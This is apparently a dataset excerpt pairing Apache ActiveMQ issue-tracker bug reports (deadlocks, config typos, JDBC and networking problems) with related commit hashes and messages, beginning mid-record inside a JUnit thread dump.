    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Scheduler"" daemon prio=5 tid=0x0052dcf0 nid=0x184a600 in Object.wait() [0xf1397000..0xf1397ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c3d6210> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:432)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.TimeUnit.timedWait(TimeUnit.java:294)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:156)
    [junit]     - locked <0x1c3d6210> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53746"" daemon prio=9 tid=0x0052bd60 nid=0x1907c00 runnable [0xf1214000..0xf1214ad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53745"" prio=5 tid=0x0052ba20 nid=0x1908000 in Object.wait() [0xf1193000..0xf1193ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c4f4728> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch.await(CountDownLatch.java:173)
    [junit]     - locked <0x1c4f4728> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.waitStarted(DemandForwardingBridge.java:481)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:250)
    [junit]     - locked <0x1c4f47b0> (a java.lang.Object)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Default Thread Pool Thread"" daemon prio=5 tid=0x0052afc0 nid=0x18e5600 in Object.wait() [0xf1112000..0xf1112ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c4a8840> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)
    [junit]     - locked <0x1c4a8840> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""Transport Status Dector org.apache.activemq.broker.TransportConnector@426f2d"" daemon prio=9 tid=0x00529180 nid=0x18e5200 waiting on condition [0xf1091000..0xf1091ad0]
    [junit]     at java.lang.Thread.sleep(Native Method)
    [junit]     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""MulticastDiscovery: null"" daemon prio=5 tid=0x00528760 nid=0x18e5a00 runnable [0xf1010000..0xf1010ad0]
    [junit]     at java.net.PlainDatagramSocketImpl.receive0(Native Method)
    [junit]     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)
    [junit]     - locked <0x1c3e7818> (a java.net.PlainDatagramSocketImpl)
    [junit]     at java.net.DatagramSocket.receive(DatagramSocket.java:712)
    [junit]     - locked <0x1c3e7858> (a java.net.DatagramPacket)
    [junit]     - locked <0x1c3e7878> (a java.net.MulticastSocket)
    [junit]     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""Transport Status Dector org.apache.activemq.broker.TransportConnector@f0bca1"" daemon prio=9 tid=0x00528420 nid=0x18e4e00 waiting on condition [0xf0f8f000..0xf0f8fad0]
    [junit]     at java.lang.Thread.sleep(Native Method)
    [junit]     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""MulticastDiscovery: tcp://bigmac-6.local:53745"" daemon prio=5 tid=0x00527c80 nid=0x18e4a00 runnable [0xf0f0e000..0xf0f0ead0]
    [junit]     at java.net.PlainDatagramSocketImpl.receive0(Native Method)
    [junit]     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)
    [junit]     - locked <0x1c3e99f8> (a java.net.PlainDatagramSocketImpl)
    [junit]     at java.net.DatagramSocket.receive(DatagramSocket.java:712)
    [junit]     - locked <0x1c3e9a38> (a java.net.DatagramPacket)
    [junit]     - locked <0x1c3e9a58> (a java.net.MulticastSocket)
    [junit]     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""TcpTransportServer@tcp://bigmac-6.local:53745"" daemon prio=9 tid=0x00527800 nid=0x18e4600 runnable [0xf0e8d000..0xf0e8dad0]
    [junit]     at java.net.PlainSocketImpl.socketAccept(Native Method)
    [junit]     at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
    [junit]     - locked <0x1c3dd958> (a java.net.SocksSocketImpl)
    [junit]     at java.net.ServerSocket.implAccept(ServerSocket.java:450)
    [junit]     at java.net.ServerSocket.accept(ServerSocket.java:421)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:96)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Scheduler"" daemon prio=5 tid=0x005268c0 nid=0x18e4200 in Object.wait() [0xf0e0c000..0xf0e0cad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c3d6210> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:432)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.TimeUnit.timedWait(TimeUnit.java:294)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:156)
    [junit]     - locked <0x1c3d6210> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""derby.rawStoreDaemon"" daemon prio=5 tid=0x00516e60 nid=0x184d000 in Object.wait() [0xf0d0a000..0xf0d0aad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c2e5f50> (a org.apache.derby.impl.services.daemon.BasicDaemon)
    [junit]     at org.apache.derby.impl.services.daemon.BasicDaemon.rest(Unknown Source)
    [junit]     - locked <0x1c2e5f50> (a org.apache.derby.impl.services.daemon.BasicDaemon)
    [junit]     at org.apache.derby.impl.services.daemon.BasicDaemon.run(Unknown Source)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""derby.antiGC"" daemon prio=1 tid=0x00515d80 nid=0x18b5400 in Object.wait() [0xf0c89000..0xf0c89ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c2c60c8> (a org.apache.derby.impl.services.monitor.AntiGC)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at org.apache.derby.impl.services.monitor.AntiGC.run(Unknown Source)
    [junit]     - locked <0x1c2c60c8> (a org.apache.derby.impl.services.monitor.AntiGC)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""Low Memory Detector"" daemon prio=5 tid=0x0050b0a0 nid=0x1813c00 runnable [0x00000000..0x00000000]
    [junit] 
    [junit] ""CompilerThread0"" daemon prio=10 tid=0x0050a6e0 nid=0x1813800 waiting on condition [0x00000000..0xf0b06378]
    [junit] 
    [junit] ""Signal Dispatcher"" daemon prio=10 tid=0x0050a220 nid=0x1812a00 waiting on condition [0x00000000..0x00000000]
    [junit] 
    [junit] ""Finalizer"" daemon prio=8 tid=0x005099b0 nid=0x1811800 in Object.wait() [0xf0a04000..0xf0a04ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c1fbc60> (a java.lang.ref.ReferenceQueue$Lock)
    [junit]     at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:116)
    [junit]     - locked <0x1c1fbc60> (a java.lang.ref.ReferenceQueue$Lock)
    [junit]     at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:132)
    [junit]     at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:159)
    [junit] 
    [junit] ""Reference Handler"" daemon prio=10 tid=0x005095e0 nid=0x1810800 in Object.wait() [0xf0983000..0xf0983ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c1fbce0> (a java.lang.ref.Reference$Lock)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:116)
    [junit]     - locked <0x1c1fbce0> (a java.lang.ref.Reference$Lock)
    [junit] 
    [junit] ""main"" prio=5 tid=0x00501ad0 nid=0x1805400 in Object.wait() [0xf07ff000..0xf08002e0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c818088> (a org.apache.activemq.thread.SimpleTaskRunner$1)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at org.apache.activemq.thread.SimpleTaskRunner.shutdown(SimpleTaskRunner.java:88)
    [junit]     - locked <0x1c818088> (a org.apache.activemq.thread.SimpleTaskRunner$1)
    [junit]     at org.apache.activemq.ActiveMQSessionExecutor.stop(ActiveMQSessionExecutor.java:110)
    [junit]     at org.apache.activemq.ActiveMQSession.stop(ActiveMQSession.java:1431)
    [junit]     at org.apache.activemq.ActiveMQConnection.stop(ActiveMQConnection.java:464)
    [junit]     at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:516)
    [junit]     at org.apache.activemq.transport.TopicClusterTest.tearDown(TopicClusterTest.java:98)
    [junit]     at junit.framework.TestCase.runBare(TestCase.java:130)
    [junit]     at junit.framework.TestResult$1.protect(TestResult.java:106)
    [junit]     at junit.framework.TestResult.runProtected(TestResult.java:124)
    [junit]     at junit.framework.TestResult.run(TestResult.java:109)
    [junit]     at junit.framework.TestCase.run(TestCase.java:118)
    [junit]     at junit.framework.TestSuite.runTest(TestSuite.java:208)
    [junit]     at junit.framework.TestSuite.run(TestSuite.java:203)
    [junit]     at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:325)
    [junit]     at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:536)
    [junit] 
    [junit] ""VM Thread"" prio=10 tid=0x00508e60 nid=0x1803c00 runnable 
    [junit] 
    [junit] ""VM Periodic Task Thread"" prio=10 tid=0x0050c760 nid=0x1814000 waiting on condition 
    [junit] 
    [junit] ""Exception Catcher Thread"" prio=10 tid=0x00501cd0 nid=0x1806a00 runnable 
    [junit] 
    [junit] Found one Java-level deadlock:
    [junit] =============================
    [junit] ""session Task"":
    [junit]   waiting to lock monitor 0x01810e68 (object 0x1c926760, a java.util.LinkedList),
    [junit]   which is held by ""tcp://localhost/127.0.0.1:53745""
    [junit] ""tcp://localhost/127.0.0.1:53745"":
    [junit]   waiting to lock monitor 0x01810e8c (object 0x1c8c9340, a org.apache.activemq.broker.region.QueueSubscription),
    [junit]   which is held by ""session Task""
    [junit] 
    [junit] Java stack information for the threads listed above:
    [junit] ===================================================
    [junit] ""session Task"":
    [junit]     at org.apache.activemq.broker.region.Queue.dropEvent(Queue.java:263)
    [junit]     - waiting to lock <0x1c926760> (a java.util.LinkedList)
    [junit]     at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:55)
    [junit]     at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:133)
    [junit]     - locked <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)
    [junit]     at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:203)
    [junit]     at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:329)
    [junit]     at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:176)
    [junit]     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)
    [junit]     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)
    [junit]     at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:71)
    [junit]     at org.apache.activemq.broker.AbstractConnection.processMessageAck(AbstractConnection.java:342)
    [junit]     at org.apache.activemq.command.MessageAck.visit(MessageAck.java:178)
    [junit]     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
    [junit]     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)
    [junit]     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
    [junit]     - locked <0x1c8180d8> (a java.lang.Object)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
    [junit]     at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1041)
    [junit]     at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1617)
    [junit]     at org.apache.activemq.ActiveMQMessageConsumer.afterMessageIsConsumed(ActiveMQMessageConsumer.java:554)
    [junit]     at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:716)
    [junit]     at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:93)
    [junit]     at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:146)
    [junit]     at org.apache.activemq.thread.SimpleTaskRunner.runTask(SimpleTaskRunner.java:110)
    [junit]     at org.apache.activemq.thread.SimpleTaskRunner.access$100(SimpleTaskRunner.java:25)
    [junit]     at org.apache.activemq.thread.SimpleTaskRunner$1.run(SimpleTaskRunner.java:43)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] ""tcp://localhost/127.0.0.1:53745"":
    [junit]     at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:58)
    [junit]     - waiting to lock <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)
    [junit]     at org.apache.activemq.broker.region.QueueSubscription.add(QueueSubscription.java:38)
    [junit]     at org.apache.activemq.broker.region.policy.RoundRobinDispatchPolicy.dispatch(RoundRobinDispatchPolicy.java:53)
    [junit]     - locked <0x1c926f28> (a edu.emory.mathcs.backport.java.util.concurrent.CopyOnWriteArrayList)
    [junit]     at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:210)
    [junit]     - locked <0x1c926760> (a java.util.LinkedList)
    [junit]     at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:179)
    [junit]     at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:280)
    [junit]     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)
    [junit]     at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:164)
    [junit]     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)
    [junit]     at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:107)
    [junit]     at org.apache.activemq.broker.AbstractConnection.processRemoveConsumer(AbstractConnection.java:431)
    [junit]     at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:63)
    [junit]     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
    [junit]     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)
    [junit]     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
    [junit]     - locked <0x1c80aac8> (a java.lang.Object)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteConsumerAdvisory(DemandForwardingBridge.java:331)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:235)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] Found 1 deadlock.                                                                                        ",82200b6e70e1a93adf023a040eb1737a02c2fd37,add test case for https://issues.apache.org/jira/browse/AMQ-5752 - fix needs some thought
12481531,AMQ-563,HTTP transport is not fully implemented yet.  Disabling test for now.,741e3aad3eb455220759afdd8001311727083882,"https://issues.apache.org/jira/browse/AMQ-5630 - add rejectDurableConsumers boolen attribute - when true, requests to create durable subscriptions will fail with a JMSException - not allowed"
12481531,AMQ-563,HTTP transport is not fully implemented yet.  Disabling test for now.,bbf288b12c22298f7ee6bc5964080ffc0532dc89,https://issues.apache.org/jira/browse/AMQ-5639 - fix regression in NetworkRouteTest eashmock test
12481437,AMQ-559,"The file org/activemq/activemq.dtd in activemq-core-3.2.2.jar contains some duplicate lines.  My XML parser (OC4J) 
complains about these.  Here are the duplicated lines:

<!--
	Default values for all bean definitions. Can be overridden at
	the ""bean"" level. See those attribute definitions for details.
-->
<!ATTLIST beans default-lazy-init (true | false) ""false"">
<!ATTLIST beans default-dependency-check (none | objects | simple | all) ""none"">
<!ATTLIST beans default-autowire (no | byName | byType | constructor | autodetect) ""no"">

These lines appear starting a line 21 and line 539.  Removing the second set of duplicate lines should resolve the issue.

",1c72579d7a0017bd22e800e47d34e3f748601a9a,"https://issues.apache.org/jira/browse/AMQ-5598

Parallel connection test, could not reproduce issue."
12481583,AMQ-556,"The o.a.a.store.jdbc.TransactionContext does not correctly process the Statement.SUCCESS_NO_INFO return code from the executeBatch() method.
From http://java.sun.com/j2se/1.4.2/docs/api/java/sql/Statement.html#executeBatch()
""A value of SUCCESS_NO_INFO -- indicates that the command was processed successfully but that the number of rows affected is unknown""
Line 92 should be
                if ( rc[i]!= 1 && rc[i]!=Statement.SUCCESS_NO_INFO) {
instead of 
                if ( rc[i]!= 1 ) {
",55f040e616899262d19c2bd1178826a65359516c,https://issues.apache.org/jira/browse/AMQ-5568  - ensure directory exists - fix ci
12481556,AMQ-541,"It appears that the activemq.xml configuration file contains a typo with respect to the adapterClass attribute settings on the jdbcPersistence element with dataSourceRef=""mysql-ds"". The default value of the adapterClass attribute is 

org.activemq.store.jdbc.adapter.BlobJDBCAdaptor

However, the class name is actually

org.activemq.store.jdbc.adapter.BlobJDBCAdapter
                                                                                        ^

This manifests itself as an error on startup when you try to use this adapter class.



",dffccb1c7dc8e4b4a6282fd5056dfd854d2d2a9b,https://issues.apache.org/jira/browse/AMQ-5417 - use proper classloader in TaskRunnerFactory
12481556,AMQ-541,"It appears that the activemq.xml configuration file contains a typo with respect to the adapterClass attribute settings on the jdbcPersistence element with dataSourceRef=""mysql-ds"". The default value of the adapterClass attribute is 

org.activemq.store.jdbc.adapter.BlobJDBCAdaptor

However, the class name is actually

org.activemq.store.jdbc.adapter.BlobJDBCAdapter
                                                                                        ^

This manifests itself as an error on startup when you try to use this adapter class.



",5e7b70f11fb53cb1a0a00edc5e61faf90bbdce78,"https://issues.apache.org/jira/browse/AMQ-5413

ensure drain completion clear currently tracked credit value, next flow
should update to the correct value."
12481599,AMQ-534,"OpenWireScript.java contains a package declaration for org.apache.activemq.openwire.tool but is in the directory hierarchy for org.activemq.openwire.tool.

I've no idea if it's important, but it's the only thing preventing me from compiling all activemq in Eclipse (after using 'maven eclipse' to generate the .classpath and .project files). ",2d9475c4f022d3fbf498692f1bb64841d30feb35,"https://issues.apache.org/jira/browse/AMQ-5346

Apply patch for link detach event from @gemmellr"
12481505,AMQ-531,"Apparently there is an issue with XBean now that Spring 2.0 (starting with M2) is compiled against a Java 5 compiler (http://jira.codehaus.org/browse/XB-7).  It's probably worth investigating how long before XBean releases a fix and postponing the 4.0 release until they do.  If not, at least documenting in a known issues list that ActiveMQ 4.0 can't working with 2.0M2 and later until a later release where they do fix it.",c391321d1b5b59542d847717654b0d4dba54cf2f,"https://issues.apache.org/jira/browse/AMQ-5315

Fix for potential NPE on transport error."
12481505,AMQ-531,"Apparently there is an issue with XBean now that Spring 2.0 (starting with M2) is compiled against a Java 5 compiler (http://jira.codehaus.org/browse/XB-7).  It's probably worth investigating how long before XBean releases a fix and postponing the 4.0 release until they do.  If not, at least documenting in a known issues list that ActiveMQ 4.0 can't working with 2.0M2 and later until a later release where they do fix it.",a095e9b9ddc32b7bd47ec2482725f2ccf5300d54,"https://issues.apache.org/jira/browse/AMQ-5310

Adding tests that validate the code follows the JMS Spec expectations
for behavior of closed consumers and producers."
12481322,AMQ-530,"
The method in DefaultThreadPools should be called getDefaultPool() not getDeaultPool().
",acf84b43e9b7c8aaf92784569075f00e83cf4809,https://issues.apache.org/jira/browse/AMQ-5304 - providing test case
12481322,AMQ-530,"
The method in DefaultThreadPools should be called getDefaultPool() not getDeaultPool().
",6bdce73d838abccd8495c979c45bbff8a8bdfc5f,https://issues.apache.org/jira/browse/AMQ-5304 - ignore the test for now
12481322,AMQ-530,"
The method in DefaultThreadPools should be called getDefaultPool() not getDeaultPool().
",98f707bd1e733821a02e13b6ae0fe9bc8a0ed9b0,https://issues.apache.org/jira/browse/AMQ-5304 - still missing unit test case
12481975,AMQ-527,"Setup: 

3 networked brokers, B1, B2, and B3, on 3 servers, connected using multicast discovery. activemq.xml: 

 <broker useJmx=""false"" brokerName=""B1""> 
 
 <persistenceAdapter>
        <journaledJDBC journalLogFiles=""5"" dataDirectory=""foo"" dataSource=""#mysql-ds""/>
 </persistenceAdapter>
 
 <transportConnectors> 
 <transportConnector uri=""tcp://localhost:61616"" discoveryUri=""multicast://default""/> 
 </transportConnectors> 
 
 <networkConnectors> 
 <networkConnector uri=""multicast://default""/> 
 </networkConnectors> 
 
 </broker> 
 
 <bean id=""mysql-ds"" class=""org.apache.commons.dbcp.BasicDataSource"" destroy-method=""close"">
           <property name=""driverClassName"" value=""com.mysql.jdbc.Driver""/>
           <property name=""url"" value=""jdbc:mysql://localhost/activemq?relaxAutoCommit=true""/>
                 <property name=""username"" value=""activemqUser""/>
                 <property name=""password"" value=""activemqPwd""/>
                 <property name=""poolPreparedStatements"" value=""true""/>
 </bean>

Similar for B2 and B3. 

Two queues: Q1 and Q2. 

Two producers, one for each queue, both producers connected to B1. 

One Q1 cosumer connected to B1, another Q1 consumer on B2. 

One Q2 consumer connected to B2, another Q2 consumer connected to B3. 

The problems:

Problem 1: 
Q1 messages are all consumed on B1, never delivered to B2, although there is a Q1 consumer on B2. I understand this is probably the expected behavior, although this definitely looks like a load balancing issue. 

Problem 2: 
All Q2 messages remain persistented in the MySQL DB on B1, even after being successfully forwarded to B2 and B3 and consumed there. 

Problem 3: 
When all the JMS entities are stoped and restarted, Q1 works fine after a while, but all Q2 messages are no longer forwarded to B2 and B3. This means that all Q2 messages are not consumed but persisted instead, further increase the size of the persistent store. 
",2b53036b27591ad62db16516bd682e811ffae719,"Excluding some tests which hang Jenkins on Windows and Solaris, see AMQ-5270"
12481389,AMQ-524,The clientId property on the activation spec was not being honnored.,fe1d05082860cff8fd2585e6dc3c3e04477e29f8,"AMQ-5242 excluding text because of failures/hangs on AIX, Solaris, Windows"
12481400,AMQ-516," ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start
 ERROR: java.lang.Exception: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start",b0bf144e7a6473f207e4897f9a0971665f0e2b66,"Ignoring testAdvisory test for now, see https://issues.apache.org/jira/browse/AMQ-5164"
12481400,AMQ-516," ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start
 ERROR: java.lang.Exception: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start",c915b19a205d37c2faad05178de716dca64981d5,"Fixed AMQ-5160, removed producer's retain property from retained messages"
12481400,AMQ-516," ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start
 ERROR: java.lang.Exception: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start",3ba129561c28b3ac36a7d8a8b677cf13797bec9b,https://issues.apache.org/jira/browse/AMQ-5160 - start/stop wrapped policy
12481400,AMQ-516," ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start
 ERROR: java.lang.Exception: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: start",25600944e662279ec1113acd4d27e9c64ba8415f,AMQ-5167 ActiveMQ web-cosole fails to start in Karaf - missing import
12483917,AMQ-513,"Oracle driver is not supported. This because the getBlob is not implemented.


---------------------------------------stacktrace:
java.lang.IndexOutOfBoundsException
	at java.io.DataInputStream.readFully(DataInputStream.java:263)
	at org.apache.activemq.openwire.BooleanStream.unmarshal(BooleanStream.java:88)
	at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:213)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
	at java.lang.Thread.run(Thread.java:534)

2006-01-30 15:28:06,959 DEBUG [tcp:///127.0.0.1:1376] region.AbstractRegion (AbstractRegion.java:75)     - Adding destination: queue://queue
2006-01-30 15:28:07,037 DEBUG [tcp:///127.0.0.1:1376] broker.AbstractConnection (AbstractConnection.java:194)     - Sync error occurred: java.io.IOException: Failed to recover container. Reason: java.sql.SQLException: Invalid column type: getBLOB not implemented for class oracle.jdbc.driver.T4CNumberAccessor
java.io.IOException: Failed to recover container. Reason: java.sql.SQLException: Invalid column type: getBLOB not implemented for class oracle.jdbc.driver.T4CNumberAccessor
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:30)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.recover(JDBCMessageStore.java:158)
	at org.apache.activemq.store.ProxyMessageStore.recover(ProxyMessageStore.java:49)
	at org.apache.activemq.broker.region.Queue.<init>(Queue.java:88)
	at org.apache.activemq.broker.region.QueueRegion.createDestination(QueueRegion.java:59)
	at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:76)
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:188)
